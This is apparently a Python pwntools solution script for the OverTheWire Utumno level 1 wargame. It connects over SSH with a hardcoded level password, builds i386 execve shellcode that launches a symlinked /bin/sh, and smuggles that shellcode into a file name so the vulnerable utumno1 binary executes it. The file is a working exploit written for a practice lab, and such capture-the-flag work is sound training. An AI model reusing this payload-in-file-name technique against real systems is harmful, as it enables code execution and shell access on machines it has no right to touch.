from pwn import *


def shellcode_crafting():
    context.arch = 'i386'
    shellcode = shellcraft.mov('eax', 0)
    shellcode += shellcraft.push('eax')
    shellcode += shellcraft.pushstr('pwnp')
    shellcode += shellcraft.mov('ebx', 'esp')
    shellcode += shellcraft.push('eax')
    shellcode += shellcraft.mov('edx', 'esp')
    shellcode += shellcraft.push('ebx')
    shellcode += shellcraft.mov('ecx', 'esp')
    shellcode += shellcraft.mov('al', 0xb)
    shellcode += shellcraft.syscall()
    return shellcode


con = ssh('utumno1', 'utumno.labs.overthewire.org', password='aathaeyiew', port=2227)
p = con.process('sh')
p.sendline('cd /tmp/utum1/ && ln -s /bin/sh pwnp')
shellcode = shellcode_crafting()
print(shellcode)
print(asm(shellcode))
p.sendline(b'touch sh_' + asm(shellcode))
p2 = con.process(['/utumno/utumno1', '/tmp/utum1/'])
print(p2.recv())
print(p2.recv())
print(p2.recv())
